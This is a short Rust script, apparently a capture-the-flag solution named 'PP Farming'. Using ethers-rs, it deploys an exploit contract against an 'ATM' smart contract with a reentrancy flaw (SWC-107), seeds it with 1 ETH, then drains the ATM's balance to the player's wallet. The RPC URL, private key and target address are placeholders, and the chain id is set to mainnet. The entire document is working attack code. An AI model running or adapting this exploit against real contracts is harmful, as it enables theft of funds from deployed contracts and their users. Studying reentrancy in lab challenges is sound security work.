// PP Farming: reentrancy exploit.
// withdrawPP sends ETH before zeroing scores[msg.sender] (SWC-107).
// Exploit::attack seeds a score then reenters withdrawPP from receive()
// until the ATM is dry.
//
// deps: ethers = { version = "2", features = ["abigen"] }, tokio = { version = "1", features = ["full"] }, eyre = "0.6"

use ethers::prelude::*;
use ethers::utils::{format_ether, parse_ether};
use eyre::Result;
use std::sync::Arc;

abigen!(
    Exploit,
    r#"[constructor(address _target) function attack() external payable function drain(address to) external]"#
);

const RPC_URL: &str = "http://REPLACE_RPC";
const PLAYER_KEY: &str = "REPLACE_PRIVKEY";
const ATM_ADDR: &str = "REPLACE_ATM";

#[tokio::main]
async fn main() -> Result<()> {
    let provider = Provider::<Http>::try_from(RPC_URL)?;
    let wallet: LocalWallet = PLAYER_KEY.parse::<LocalWallet>()?.with_chain_id(1u64);
    let client = Arc::new(SignerMiddleware::new(provider, wallet.clone()));
    let atm: Address = ATM_ADDR.parse()?;

    println!("player  {:?}", wallet.address());
    println!("balance {} ETH", format_ether(client.get_balance(wallet.address(), None).await?));
    println!("atm bal {} ETH", format_ether(client.get_balance(atm, None).await?));

    let exploit = Exploit::deploy(client.clone(), atm)?.send().await?;
    println!("exploit deployed at {:?}", exploit.address());

    exploit.attack().value(parse_ether("1")?).send().await?.await?;
    exploit.drain(wallet.address()).send().await?.await?;

    println!("atm bal now {} ETH", format_ether(client.get_balance(atm, None).await?));
    Ok(())
}
